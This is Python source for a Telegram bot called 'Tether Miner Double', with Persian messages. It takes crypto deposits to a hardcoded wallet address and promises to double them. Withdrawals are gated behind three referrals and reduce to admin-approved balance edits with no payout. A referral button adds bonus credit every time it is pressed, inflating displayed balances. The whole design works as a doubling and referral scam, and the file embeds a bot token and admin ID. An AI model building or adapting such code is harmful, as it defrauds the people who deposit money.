import logging
import sqlite3

from telegram import Update
from telegram import InlineKeyboardButton
from telegram import InlineKeyboardMarkup

from telegram.ext import ApplicationBuilder
from telegram.ext import CallbackQueryHandler
from telegram.ext import CommandHandler
from telegram.ext import MessageHandler
from telegram.ext import ContextTypes
from telegram.ext import ConversationHandler
from telegram.ext import filters

TOKEN = "8047284110:AAGLIH-VVWRcTlwimcTQy0zimkiiBKY3vxo"
ADMIN_ID = 6644712689

logging.basicConfig(level=logging.INFO)

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    fullname TEXT,
    referrals INTEGER DEFAULT 0,
    balance REAL DEFAULT 0.0
)
""")
conn.commit()

DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WALLET_ADDRESS, SUPPORT_MESSAGE, ADMIN_REPLY = range(6)

def get_referral_link(user_id):
    return f"https://t.me/TetherMinerDouble_Bot?start={user_id}"

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Deposit", callback_data="deposit"),
            InlineKeyboardButton("Withdrawal", callback_data="withdraw"),
            InlineKeyboardButton("Balance", callback_data="balance")
        ],
        [
            InlineKeyboardButton("Referral", callback_data="referral"),
            InlineKeyboardButton("Support", callback_data="support")
        ]
    ])

def back_button(callback_data="menu"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data=callback_data)]])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username, fullname) VALUES (?, ?, ?)",
                   (user.id, user.username or "-", user.full_name))
    conn.commit()
    if context.args:
        referrer_id = int(context.args[0])
        if referrer_id != user.id:
            cursor.execute("UPDATE users SET referrals = referrals + 1 WHERE user_id = ?", (referrer_id,))
            conn.commit()
            await context.bot.send_message(referrer_id, text=f"کاربر {user.full_name} (@{user.username}) با لینک دعوت شما عضو شد")
    await update.message.reply_text("Welcome to Tether Miner Double!", reply_markup=main_menu_keyboard())

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    match query.data:
        case "menu":
            await query.message.edit_text("بازگشت به منوی اصلی:", reply_markup=main_menu_keyboard())
        case "deposit":
            await query.message.edit_text("چه مقدار دلار می‌خواهید واریز کنید؟\nحداقل واریز ۵ دلار است.", reply_markup=back_button())
            return DEPOSIT_AMOUNT
        case "withdraw":
            cursor.execute("SELECT referrals FROM users WHERE user_id = ?", (user_id,))
            if cursor.fetchone()[0] < 3:
                await query.message.edit_text(f"برای برداشت باید حداقل ۳ زیرمجموعه داشته باشید.\n{get_referral_link(user_id)}", reply_markup=back_button())
                return ConversationHandler.END
            await query.message.edit_text("چه مقدار می‌خواهید برداشت کنید؟", reply_markup=back_button())
            return WITHDRAW_AMOUNT
        case "balance":
            cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
            balance = cursor.fetchone()[0]
            await query.message.edit_text(f"موجودی شما: {balance} دلار", reply_markup=back_button())
        case "referral":
            cursor.execute("SELECT referrals FROM users WHERE user_id = ?", (user_id,))
            count = cursor.fetchone()[0]
            bonus = count * 1.5
            cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (bonus, user_id))
            conn.commit()
            cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
            balance = cursor.fetchone()[0]
            await query.message.edit_text(f"لینک دعوت: {get_referral_link(user_id)}\nزیرمجموعه‌ها: {count}\nموجودی کل: {balance} دلار", reply_markup=back_button())
        case "support":
            await query.message.edit_text("پیغام خود را ارسال کنید:", reply_markup=back_button())
            return SUPPORT_MESSAGE

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        if amount < 5:
            await update.message.reply_text("حداقل واریز ۵ دلار است.", reply_markup=main_menu_keyboard())
            return ConversationHandler.END
        context.user_data["deposit_amount"] = amount
        await update.message.reply_text("لطفاً مبلغ را به آدرس زیر واریز کنید و مدرک را ارسال کنید:\n\n`0xcD3FcEf99251771a3dc1F6Aa992ff23f1824a1bB`", parse_mode="Markdown", reply_markup=back_button("deposit"))
        return DEPOSIT_PROOF
    except:
        await update.message.reply_text("عدد نامعتبر است.", reply_markup=back_button("deposit"))
        return ConversationHandler.END

async def deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    amount = context.user_data.get("deposit_amount", 0)
    proof = update.message.text or (update.message.photo[-1].file_id if update.message.photo else "")
    keyboard = [[InlineKeyboardButton("تایید", callback_data=f"confirm_deposit_{user.id}_{amount}"), InlineKeyboardButton("رد", callback_data=f"reject_deposit_{user.id}")]]
    await context.bot.send_message(ADMIN_ID, f"درخواست واریز:\nکاربر: {user.full_name} (@{user.username})\nمقدار: {amount}\nمدرک:\n{proof}", reply_markup=InlineKeyboardMarkup(keyboard))
    await update.message.reply_text("در حال بررسی توسط ادمین.")
    return ConversationHandler.END

async def confirm_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, _, user_id, amount = update.callback_query.data.split("_")
    user_id = int(user_id)
    amount = float(amount)
    cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount * 2, user_id))
    conn.commit()
    await context.bot.send_message(user_id, text="واریز تایید شد.")
    await update.callback_query.message.delete()

async def reject_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, _, user_id = update.callback_query.data.split("_")
    await context.bot.send_message(int(user_id), text="واریز شما رد شد.")
    await update.callback_query.message.delete()

async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        context.user_data["withdraw_amount"] = amount
        await update.message.reply_text("آدرس کیف پول خود را وارد کنید:", reply_markup=back_button("withdraw"))
        return WALLET_ADDRESS
    except:
        await update.message.reply_text("عدد نامعتبر.", reply_markup=back_button("withdraw"))
        return ConversationHandler.END

async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    amount = context.user_data["withdraw_amount"]
    address = update.message.text
    keyboard = [[InlineKeyboardButton("تایید", callback_data=f"confirm_withdraw_{user.id}_{amount}"), InlineKeyboardButton("رد", callback_data=f"reject_withdraw_{user.id}")]]
    await context.bot.send_message(ADMIN_ID, f"درخواست برداشت:\nکاربر: {user.full_name} (@{user.username})\nمقدار: {amount}\nآدرس: {address}", reply_markup=InlineKeyboardMarkup(keyboard))
    await update.message.reply_text("درخواست شما برای بررسی ارسال شد.")
    return ConversationHandler.END

async def confirm_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, _, user_id, amount = update.callback_query.data.split("_")
    user_id = int(user_id)
    amount = float(amount)
    cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    await context.bot.send_message(user_id, "برداشت تایید شد.")
    await update.callback_query.message.delete()

async def reject_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, _, user_id = update.callback_query.data.split("_")
    await context.bot.send_message(int(user_id), "برداشت رد شد.")
    await update.callback_query.message.delete()

async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    context.user_data["reply_to"] = user.id
    await context.bot.send_message(ADMIN_ID, f"پیام پشتیبانی از {user.full_name} (@{user.username}):\n{update.message.text}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("پاسخ", callback_data=f"reply_support_{user.id}")]]))
    await update.message.reply_text("پیام ارسال شد.")
    return ConversationHandler.END

async def reply_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["reply_to"] = int(update.callback_query.data.split("_")[-1])
    await update.callback_query.message.reply_text("متن پاسخ را وارد کنید:")
    return ADMIN_REPLY

async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = context.user_data.get("reply_to")
    await context.bot.send_message(user_id, f"پاسخ ادمین:\n{update.message.text}")
    await update.message.reply_text("پاسخ ارسال شد.")
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button)],
        states={
            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
            DEPOSIT_PROOF: [MessageHandler(filters.ALL, deposit_proof)],
            WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
            WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
            SUPPORT_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)],
            ADMIN_REPLY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_reply)],
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(confirm_deposit, pattern=r"^confirm_deposit_"))
    app.add_handler(CallbackQueryHandler(reject_deposit, pattern=r"^reject_deposit_"))
    app.add_handler(CallbackQueryHandler(confirm_withdraw, pattern=r"^confirm_withdraw_"))
    app.add_handler(CallbackQueryHandler(reject_withdraw, pattern=r"^reject_withdraw_"))
    app.add_handler(CallbackQueryHandler(reply_support, pattern=r"^reply_support_"))
    app.add_handler(CallbackQueryHandler(button))

    app.run_polling()

if __name__ == "__main__":
    main()
